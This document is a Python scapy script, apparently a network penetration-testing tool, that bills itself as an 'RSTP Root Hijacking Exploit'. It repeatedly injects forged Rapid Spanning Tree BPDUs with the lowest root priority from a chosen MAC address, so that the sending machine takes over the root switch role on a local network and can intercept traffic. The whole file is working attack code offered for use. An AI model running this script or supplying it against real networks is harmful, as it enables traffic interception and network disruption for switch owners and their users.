#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.l2 import *
import argparse

print (r"""
  ▄████  ██▀███   ██▓▄▄▄█████▓
 ██▒ ▀█▒▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░
░▓█  ██▓▒██▀▀█▄  ░██░░ ▓██▓ ░ 
░▒▓███▀▒░██▓ ▒██▒░██░  ▒██▒ ░ 
 ░▒   ▒ ░ ▒▓ ░▒▓░░▓    ▒ ░░   
  ░   ░   ░▒ ░ ▒░ ▒ ░    ░    
░ ░   ░   ░░   ░  ▒ ░  ░      
      ░    ░      ░          
""")
print ("RSTP Root Hijacking Exploit")
print ("For Rapid Spanning Tree Protocol version")
print("\nAuthor: Caster, @c4s73r, <c4s73r@protonmail.com>\n")

STPMulticast = "01:80:C2:00:00:00"

def take_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", dest="interface", type=str, required=True)
    parser.add_argument("--mac", dest="evilmac", type=str, required=True)
    args = parser.parse_args()

    return args



def exploit(interface, evilmac):
    frame = Dot3(src=args.evilmac, dst=STPMulticast)
    llc_layer = LLC(dsap=0x042, ssap=0x042, ctrl=3)
    stp_layer = STP(version=0x02, bpduflags=0x03c, rootid=0x01, rootmac=args.evilmac, pathcost=0x01, bridgeid=0x01, bridgemac=args.evilmac, portid=1)
    evil_stp = frame/llc_layer/stp_layer
    print("[+] Start of RSTP injection. Interception of the root switch role... You can check this from Wireshark")
    sendp(evil_stp, iface=args.interface, inter=2, loop=1, verbose=1)

args = take_arguments()
exploit(args.interface, args.evilmac)
